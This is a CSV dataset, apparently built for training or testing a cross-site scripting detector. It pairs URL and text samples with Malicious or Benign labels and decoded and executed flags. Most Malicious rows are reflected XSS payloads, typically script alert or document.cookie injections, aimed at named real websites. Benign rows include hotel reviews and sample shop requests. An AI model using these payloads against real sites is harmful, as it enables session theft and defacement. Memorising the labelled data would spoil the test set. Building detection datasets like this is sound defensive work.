Payloads,Class,decoded,executed,parser_changed
http://search.smartone-vodafone.com/search/search_result.jsp?hitsperpage=%22%3cscript%3ealert%28%22x<br>ssed%22%29%3c/script%3e&amp;lang=tchinese&amp;query=,Malicious,"http://search.smartone-vodafone.com/search/search_result.jsp?hitsperpage=""<script>alert(""xssed"")</script>&lang=tchinese&query=",True,True
http://www.jart.at/jart/prj3/creativespace/website.jart?rel=de&amp;reserve-mode=active&amp;content-id=119135<br>4857766&amp;news_id=1219235437272&amp;start=0%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3c<br>marquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.jart.at/jart/prj3/creativespace/website.jart?rel=de&reserve-mode=active&content-id=1191354857766&news_id=1219235437272&start=0'""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.wikihow.com/get-the-rarest-fish-on-fish-tycoon&t=1396648758046&n=5981163&k=mainentity,Benign,http://www.wikihow.com/get-the-rarest-fish-on-fish-tycoon&t=1396648758046&n=5981163&k=mainentity,False,False
http://search.ca.com/search/ca?style=en&amp;search_button=search&amp;qt=&quot;&gt;&lt;script&gt;alert(/=xssbydt=/)&lt;/script<br>&gt;&amp;col=,Malicious,"http://search.ca.com/search/ca?style=en&search_button=search&qt=""><script>alert(/=xssbydt=/)</script>&col=",True,True
http://www.parl.gc.ca/information/about/people/key/pm/index.asp?language=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/<br>script&gt;,Malicious,"http://www.parl.gc.ca/information/about/people/key/pm/index.asp?language=""><script>alert(""maxwel"")</script>",True,True
http://www.wikihow.com/be-like-saint-jimmy-from-american-idiot&t=1396564154339&n=2654302&k=mainentity,Benign,http://www.wikihow.com/be-like-saint-jimmy-from-american-idiot&t=1396564154339&n=2654302&k=mainentity,False,False
http://www.muslimtorrents.com/torrents-search.php?search=&lt;script&gt;alert('the_miller')&lt;/script&gt;,Malicious,http://www.muslimtorrents.com/torrents-search.php?search=<script>alert('the_miller')</script>,True,True
http://www.wikihow.com/share-your-ask.fm-answers-on-twitter&t=1396630034910&n=5443473&k=mainentity,Benign,http://www.wikihow.com/share-your-ask.fm-answers-on-twitter&t=1396630034910&n=5443473&k=mainentity,False,False
http://www.wikihow.com/create-a-proxy-server-with-google-app-engine&t=1396534098115&n=1143549&k=mainentity,Benign,http://www.wikihow.com/create-a-proxy-server-with-google-app-engine&t=1396534098115&n=1143549&k=mainentity,False,False
"ho-hum legacy nice room. bed not very comfortable. location in a not very nice section of town (south phoenix is heavily populated by gangs and drug dealers). front desk frequently not attended. grounds are well kept, but resort is overpriced, as is the food at the only restaurant on the property (a bar and grill). breakfast buffet was pretty good. overall, a mediocre resort.",Benign,"ho-hum legacy nice room. bed not very comfortable. location in a not very nice section of town (south phoenix is heavily populated by gangs and drug dealers). front desk frequently not attended. grounds are well kept, but resort is overpriced, as is the food at the only restaurant on the property (a bar and grill). breakfast buffet was pretty good. overall, a mediocre resort.",False,False
http://iraqlinks.com/dir/s.asp?l=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://iraqlinks.com/dir/s.asp?l=""><script>alert(""maxwel"")</script>",True,True
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=samantha&password=culp5o&nombre=giovana&apellidos=ordeig+mosqueda&email=kuzmina%40acch.dm&dni=39304228b&direccion=jaime+gasull+78+&ciudad=villaverde+del+monte&cp=43411&provincia=%c1lava&ntc=4182019851914962&b1=registrar,Benign,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=samantha&password=culp5o&nombre=giovana&apellidos=ordeig mosqueda&email=kuzmina@acch.dm&dni=39304228b&direccion=jaime gasull 78 &ciudad=villaverde del monte&cp=43411&provincia=�lava&ntc=4182019851914962&b1=registrar,False,False
https://resellertest.enom.com/login.asp?page=&quot;&gt;&lt;script&gt;alert(&quot;nemessis-www.rstzone.org-ie6only&quot;)&lt;/sc<br>ript&gt;,Malicious,"https://resellertest.enom.com/login.asp?page=""><script>alert(""nemessis-www.rstzone.org-ie6only"")</script>",True,True
http://www.erectorsexshop.com/odeme.asp?defurunid=%22%3e%3cscript%3ealert(%22document.cookie%22)%3c/<br>script%3e,Malicious,"http://www.erectorsexshop.com/odeme.asp?defurunid=""><script>alert(""document.cookie"")</script>",True,True
http://wildlife.utah.gov/hotspots/detailed.php?id=4&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://wildlife.utah.gov/hotspots/detailed.php?id=4""><script>alert(document.cookie)</script>",True,True
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=marasliy&password=2org4&nombre=mail%e9n&apellidos=aleu+alcaide&email=laurie%40martosfutbolsala.gm&dni=18455622p&direccion=calle+antolin+garcia%2c+s%2fn+&ciudad=casasola&cp=04810&provincia=barcelona&ntc=6739508429793646&b1=registrar,Benign,"http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=marasliy&password=2org4&nombre=mail�n&apellidos=aleu alcaide&email=laurie@martosfutbolsala.gm&dni=18455622p&direccion=calle antolin garcia, s/n &ciudad=casasola&cp=04810&provincia=barcelona&ntc=6739508429793646&b1=registrar",False,False
http://www.llnl.gov/lcdocs/htar/index.jsp?show=--&gt;&lt;script&gt;alert('x')&lt;/script&gt;,Malicious,http://www.llnl.gov/lcdocs/htar/index.jsp?show=--><script>alert('x')</script>,True,True
"é??¶?¢é??©?»¹é??¾?½¤é??¬¨?»¾é??¶??é??#x201d; showreview(19164481, 'full');",Benign,"é??¶?¢é??©?»¹é??¾?½¤é??¬¨?»¾é??¶??é??#x201d; showreview(19164481, 'full');",False,False
http://bilgisayardershanesi.net/news.php?newsid=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious,"http://bilgisayardershanesi.net/news.php?newsid=""><script>alert(1)</script>",True,True
insertar&precio=2110&b1=pasar+por+caja,Benign,insertar&precio=2110&b1=pasar por caja,False,False
"<script language=""javascript""> <!-- function random_imglink(){ var myimages=new array() //specify random images below. you can have as many as you wish myimages[1]=""image1.gif"" myimages[2]=""image2.gif"" myimages[3]=""image3.gif"" myimages[4]=""image4.gif"" myimages[5]=""image5.gif"" myimages[6]=""image6.gif"" var ry=math.floor(math.random()*myimages.length) if (ry==0) ry=1 document.write('<img src=""'+myimages[ry]+'"" border=0>') } random_imglink() //--> </script>",Benign,"<script language=""javascript""> <!-- function random_imglink(){ var myimages=new array() //specify random images below. you can have as many as you wish myimages[1]=""image1.gif"" myimages[2]=""image2.gif"" myimages[3]=""image3.gif"" myimages[4]=""image4.gif"" myimages[5]=""image5.gif"" myimages[6]=""image6.gif"" var ry=math.floor(math.random()*myimages.length) if (ry==0) ry=1 document.write('<img src=""' myimages[ry] '"" border=0>') } random_imglink() //--> </script>",False,True
https://www.ytria.com/website.nsf/er_buytools?readform&amp;$c=&quot;&gt;&lt;script&gt;alert('x-hackers.us')&lt;/script&gt;,Malicious,"https://www.ytria.com/website.nsf/er_buytools?readform&$c=""><script>alert('x-hackers.us')</script>",True,True
"the best showreview(1142561, 'full');",Benign,"the best showreview(1142561, 'full');",False,False
http://www.flora.org/sustain/question/question.shtml%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/<br>script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.flora.org/sustain/question/question.shtml'""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.wikihow.com/use--flash-video-mx-pro&t=1396533826840&n=1131593&k=mainentity,Benign,http://www.wikihow.com/use--flash-video-mx-pro&t=1396533826840&n=1131593&k=mainentity,False,False
http://mail.zjhw.gov.cn/badlogin.php?tid=0&amp;lid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p+,Malicious,"http://mail.zjhw.gov.cn/badlogin.php?tid=0&lid=""><script>alert(document.cookie)</script><p ",True,True
http://service.govdelivery.com/service/subscribe.html?code=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://service.govdelivery.com/service/subscribe.html?code=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://f.www1.xwjp.com/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious,"http://f.www1.xwjp.com/orz.cgi/-/xssed.com/'>"">'><script>alert(""xss"")</script>",True,True
http://directory.webhosting.info/&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;.cfm?nft=1&amp;t=5&amp;p=1,Malicious,"http://directory.webhosting.info/""><script>alert(document.cookie)</script>.cfm?nft=1&t=5&p=1",True,True
http://www.electronics-electricals.com/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;<br>&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.electronics-electricals.com/signinform.php?msg=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
https://www.adobe.com/login/login.jsp?currentsection=try&amp;next=/products/tryadobe/download.jsp?ftpid=<br>%22%20name=%22next%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious,"https://www.adobe.com/login/login.jsp?currentsection=try&next=/products/tryadobe/download.jsp?ftpid="" name=""next""><script>alert(document.cookie)</script>",True,True
http://www.wikihow.com/come-across-as-individual-and-interesting&t=1396526567406&n=790091&k=mainentity,Benign,http://www.wikihow.com/come-across-as-individual-and-interesting&t=1396526567406&n=790091&k=mainentity,False,False
http://gmap3.touraineverte.com/api/&quot;&gt;&lt;script&gt;alert('xss by atm0n3r et vive firebug =)')&lt;/script&gt;,Malicious,"http://gmap3.touraineverte.com/api/""><script>alert('xss by atm0n3r et vive firebug =)')</script>",True,True
http://izhmoto.ru/default/search_results?what=%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious,"http://izhmoto.ru/default/search_results?what=""><script>alert(document.cookie);</script>",True,True
http://www.ourfreeonlinelayouts.info/generators/myspace-layout-code.php&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,http://www.ourfreeonlinelayouts.info/generators/myspace-layout-code.php<script>alert(document.cookie);</script>,True,True
http://www.wikihow.com/install-dosbox-emulater-using-terminal-on-ubuntu&t=1396610622922&n=4722458&k=mainentity,Benign,http://www.wikihow.com/install-dosbox-emulater-using-terminal-on-ubuntu&t=1396610622922&n=4722458&k=mainentity,False,False
"great location we booked on the recomendation of a friend who is particular with her accomodation, and the tuscan inn checked all the boxes for her, and so we decided to book directly with the property. we received a pleasant email from the booking manager, but never got to meet her to say thatnks for her prompt attention.checkin was a no stress affair, and we were directed to our room with luggage arriving promptly. the room was not large, but then this was just a base for exploring all that san francisco has to offer, and we did not need heaps of room to spead out in, just enough room to lay out our cases (4) and sit somewhere other than on the bed. the bathroom was very clean and well appointed with nice towels and toiletries, it was not big, but room enough to do what one needs to. the evening wine tasting was well patronized, and although we arrived just after the starting time, all the savouries were gone. a masseur was giving guests a massage at the same location, not sure if there was a charge involved for that service, as there was no information about that anywhere.the foyer was very cozy with the inviting fireplace and had large sofas and arm chairs and a bookcase full of interesting books, overlooking a courtyard garden filled with attractive landscaping.a consierge desk was also located in this area, and he was rather busy on the occasions he was there. we found the tourist advice to be slightly biased towards a particular company, and knew little about the sevices of other tour companies, even though one is very well know and patronized. there is a large tourist information stand near the lifts so you can peruse any of the brochures and make your own choice if he is not there or too busy.the hotel is conveniently located to the shopping centre across the road, and we made use of this to purchase our breakfast requirements, as we had not had great service from the adjoining cafe pescatore for our evening meal and thought we would do our own thing each morning. the room has a coffee perculator and a supply of reasonable coffee was repenished daily.it is in an ideal situation to acess public transport, a short walk to the end of the street near the cruise pier is the trolley car, and another short walk the other way takes you to the cable cars. pier 39 is close by and so are many other attractions such as the maratime museum, ghiradelli square, fishermans wharf, and many great vistas can be seen walking along the promenade down along the embarcadero. i would have no hesitiation in recomending this establisment to my friends, and we would return here on any future visits to san francisco, esp if we were cruising out of this port as it is very close to the cruise terminal.",Benign,"great location we booked on the recomendation of a friend who is particular with her accomodation, and the tuscan inn checked all the boxes for her, and so we decided to book directly with the property. we received a pleasant email from the booking manager, but never got to meet her to say thatnks for her prompt attention.checkin was a no stress affair, and we were directed to our room with luggage arriving promptly. the room was not large, but then this was just a base for exploring all that san francisco has to offer, and we did not need heaps of room to spead out in, just enough room to lay out our cases (4) and sit somewhere other than on the bed. the bathroom was very clean and well appointed with nice towels and toiletries, it was not big, but room enough to do what one needs to. the evening wine tasting was well patronized, and although we arrived just after the starting time, all the savouries were gone. a masseur was giving guests a massage at the same location, not sure if there was a charge involved for that service, as there was no information about that anywhere.the foyer was very cozy with the inviting fireplace and had large sofas and arm chairs and a bookcase full of interesting books, overlooking a courtyard garden filled with attractive landscaping.a consierge desk was also located in this area, and he was rather busy on the occasions he was there. we found the tourist advice to be slightly biased towards a particular company, and knew little about the sevices of other tour companies, even though one is very well know and patronized. there is a large tourist information stand near the lifts so you can peruse any of the brochures and make your own choice if he is not there or too busy.the hotel is conveniently located to the shopping centre across the road, and we made use of this to purchase our breakfast requirements, as we had not had great service from the adjoining cafe pescatore for our evening meal and thought we would do our own thing each morning. the room has a coffee perculator and a supply of reasonable coffee was repenished daily.it is in an ideal situation to acess public transport, a short walk to the end of the street near the cruise pier is the trolley car, and another short walk the other way takes you to the cable cars. pier 39 is close by and so are many other attractions such as the maratime museum, ghiradelli square, fishermans wharf, and many great vistas can be seen walking along the promenade down along the embarcadero. i would have no hesitiation in recomending this establisment to my friends, and we would return here on any future visits to san francisco, esp if we were cruising out of this port as it is very close to the cruise terminal.",False,False
http://www.frasi.net/dizionari/finlandese-italiano/default.asp?vocabolo=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/s<br>cript&gt;,Malicious,"http://www.frasi.net/dizionari/finlandese-italiano/default.asp?vocabolo=""><script>alert(""maxwel"")</script>",True,True
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7866&b1=pasar+por+caja,Benign,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7866&b1=pasar por caja,False,False
http://www.marchantbrothers.co.uk/mix.php?id=-61%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious,"http://www.marchantbrothers.co.uk/mix.php?id=-61""><script>alert(document.cookie)</script>",True,True
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=bendicty&password=20a7ll8u&nombre=fiorela&apellidos=catrileo+torrats&email=emney%40biopoint.bi&dni=05973926k&direccion=paratge+figuera+1+&ciudad=bello&cp=47513&provincia=badajoz&ntc=5440353699331255&b1=registrar,Benign,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=bendicty&password=20a7ll8u&nombre=fiorela&apellidos=catrileo torrats&email=emney@biopoint.bi&dni=05973926k&direccion=paratge figuera 1 &ciudad=bello&cp=47513&provincia=badajoz&ntc=5440353699331255&b1=registrar,False,False
http://www.consumerdirect.gov.uk/send_to_friend?id=386602&quot;&gt;&lt;iframe src=javascript:alert('xss?')&gt;,Malicious,"http://www.consumerdirect.gov.uk/send_to_friend?id=386602""><iframe src=javascript:alert('xss?')>",True,True
http://search.boston.com/local/search.do?s.tab=yp&amp;s.sm.query=&amp;s.ypsearch=wawa%22%3e%27%3e%3cu%3exx&amp;s<br>.yplocation=%22%3e%3ciframe+src%3djavascript%3aalert(123)%3e&amp;when=&amp;qf=&amp;qn=&amp;qc=&amp;qs=&amp;s.si(simplesearch<br>input).sortby=&amp;s.daterange=,Malicious,"http://search.boston.com/local/search.do?s.tab=yp&s.sm.query=&s.ypsearch=wawa"">'><u>xx&s.yplocation=""><iframe src=javascript:alert(123)>&when=&qf=&qn=&qc=&qs=&s.si(simplesearchinput).sortby=&s.daterange=",True,True
http://www.natuurkunde.nl/zoeken/dosearch.do;jsessionid=f2e94490dc841016e3bec1e986433542?querystring<br>=%22%3e%3cscript%3ealert%28123%29%3c%2fscript%3e,Malicious,"http://www.natuurkunde.nl/zoeken/dosearch.do;jsessionid=f2e94490dc841016e3bec1e986433542?querystring=""><script>alert(123)</script>",True,True
http://www.zainab.org/zainabpix/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h<br>1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.zainab.org/zainabpix/igallery.asp?d=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam%f3n+ib%e9rico&precio=85&cantidad=53&b1=a%f1adir+al+carrito,Benign,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam�n ib�rico&precio=85&cantidad=53&b1=a�adir al carrito,False,False
http://hac.kers.us/search_result.php?search_id=%22%3e%3cscript%3ealert%28%22xss%22%29%3c%2fscript%3e,Malicious,"http://hac.kers.us/search_result.php?search_id=""><script>alert(""xss"")</script>",True,True
https://newsletter.lufthansa.com/servlet/campaignrespondent?_id_=lh.6059&amp;email_address=%22%3e%3cscri<br>pt%3ealert%28document.cookie%29%3c/script%3e&amp;email_address2=%22%3e%3cscript%3ealert%28document.cooki<br>e%29%3c/script%3e&amp;gender=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e&amp;title=%22%3e%3csc<br>ript%3ealert%28document.cookie%29%3c/script%3e&amp;first_name=%22%3e%3cscript%3ealert%28document.cookie%<br>29%3c/script%3e&amp;surname=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e&amp;country_code=be&amp;la<br>nguage=e&amp;p=id__en_enr_0310#,Malicious,"https://newsletter.lufthansa.com/servlet/campaignrespondent?_id_=lh.6059&email_address=""><script>alert(document.cookie)</script>&email_address2=""><script>alert(document.cookie)</script>&gender=""><script>alert(document.cookie)</script>&title=""><script>alert(document.cookie)</script>&first_name=""><script>alert(document.cookie)</script>&surname=""><script>alert(document.cookie)</script>&country_code=be&language=e&p=id__en_enr_0310#",True,True
http://blawgsearch.justia.com/search.aspx?q=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://blawgsearch.justia.com/search.aspx?q=""><script>alert(""maxwel"")</script>",True,True
http://www.wikihow.com/make-peas-and-prawn-rice&t=1396517825550&n=344583&k=mainentity,Benign,http://www.wikihow.com/make-peas-and-prawn-rice&t=1396517825550&n=344583&k=mainentity,False,False
